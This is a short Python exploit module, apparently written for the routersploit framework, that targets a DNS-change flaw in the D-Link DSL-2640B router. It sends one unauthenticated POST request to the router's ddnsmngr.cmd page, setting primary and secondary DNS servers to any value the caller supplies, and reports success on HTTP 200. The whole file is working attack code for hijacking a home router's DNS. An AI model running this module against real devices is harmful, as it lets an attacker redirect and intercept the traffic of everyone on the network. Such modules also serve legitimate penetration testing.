# rsf exploit module
# description: Module exploits D-Link DSL-2640B DNS change vulnerability
import requests

def exploit(target, port, dns1="8.8.8.8", dns2="8.8.4.4"):
    try:
        path = f"/ddnsmngr.cmd?action=apply&service=0&enbl=0&dnsPrimary={dns1}&dnsSecondary={dns2}&dnsDynamic=0&dnsRefresh=1&dns6Type=DHCP"
        
        response = requests.post(
            f"http://{target}:{port}{path}",
            timeout=5
        )
        
        if response.status_code == 200:
            print(f"[+] DNS changed to {dns1} and {dns2}")
            return True
        return False
    except:
        return False

def check(target, port=80):
    return None  # Cannot verify without changing DNS
